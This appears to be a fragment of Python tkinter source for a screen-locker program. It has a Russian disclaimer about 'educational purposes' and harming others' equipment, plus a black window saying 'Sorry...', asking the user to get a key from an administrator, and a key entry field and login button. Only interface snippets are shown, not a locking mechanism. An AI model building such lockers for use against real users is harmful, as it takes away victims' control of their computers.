...
#Внимание! Используйте этот код в ознакомительных целях! Вы сами несёте ответственность за использование данного кода для причинения вреда чужой технике. 
time.sleep(60)
...
txt_one = Label(window, text='Sorry...', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Обратитесь к администратору и он выдаст вам ключ', font=("Arial Bold", fontsize), fg='white', bg='black')
...
txt = Entry(window)  
btn = Button(window, text="войти", command=clicked)
